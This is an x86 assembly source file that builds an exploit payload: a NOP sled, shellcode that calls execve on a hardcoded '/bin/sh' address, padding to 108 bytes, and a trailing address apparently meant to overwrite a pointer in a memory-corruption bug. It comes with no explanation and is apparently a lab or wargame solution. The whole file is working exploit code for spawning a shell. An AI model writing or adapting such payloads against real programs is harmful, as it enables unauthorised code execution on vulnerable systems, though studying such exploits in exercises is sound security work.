        .intel_syntax noprefix

        .set SYS_execve, 0xb
        .set N1, 0x804a008 + 8
        .set binsh, 0xb7ea7c58

        .section .rodata

payload_start:
        .int N1

        .rept 12
        nop
        .endr

        mov  eax, binsh
        mov  [N1], eax

        xor  eax, eax
        mov  [N1 + 4], eax

        mov  al, SYS_execve
        mov  ebx, binsh
        mov  ecx, N1
        xor  edx, edx

        int  0x80

shellcode_end:

        .rept 108 - (shellcode_end - payload_start)
        nop
        .endr

        .int N1 - 4
